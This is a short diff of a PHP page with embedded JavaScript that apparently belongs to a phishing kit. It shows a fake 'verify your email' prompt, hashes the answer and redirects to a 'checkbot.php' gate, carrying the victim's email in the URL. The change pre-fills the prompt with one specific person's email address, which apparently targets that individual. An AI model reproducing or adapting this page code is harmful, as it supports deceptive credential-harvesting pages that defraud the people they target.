@@ -533,7 +533,7 @@ $_SESSION['mail'] = @$_GET['e'];
 			// Создаем объект URLSearchParams на основе параметров
 			const params = new URLSearchParams(url_now.search);
 			
-      let email = prompt("Please verify your email", "Confirm your email");
+      let email = prompt("Please verify your email", "greg@gregsa.com");
       let key = CryptoJS.MD5(email).toString();
       
 			window.location.href = 'checkbot.php?key=' + key + '&e=' + email;
